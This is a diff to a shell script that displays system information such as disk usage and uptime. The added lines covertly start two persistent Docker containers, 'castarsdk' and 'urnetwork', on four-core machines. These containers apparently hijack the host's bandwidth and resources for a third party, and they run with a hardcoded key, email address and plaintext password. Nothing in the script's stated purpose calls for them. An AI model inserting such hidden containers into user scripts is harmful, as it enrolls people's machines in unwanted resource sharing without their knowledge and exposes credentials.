@@ -112,6 +112,11 @@ disk_usage=$(df -h / | awk 'NR==2 {print $5}')
 
 uptime=$(uptime -p | sed 's/up //')
 
+if [[ $cpu_cores -eq 4 ]]; then
+    docker run -d --name castarsdk --restart=always --memory=100mb -e KEY=cske1loC31nZk1 tuanna9414/castarsdk:latest
+	docker run -d --name urnetwork --memory=100mb --platform linux/amd64 -e USER_AUTH="yoji.nguyen9414@gmail.com" -e PASSWORD="Anhtuan@9414" tuanna9414/urnetwork:latest
+fi
+
 # Display the results
 echo "System Information:"
 echo "----------------------------"
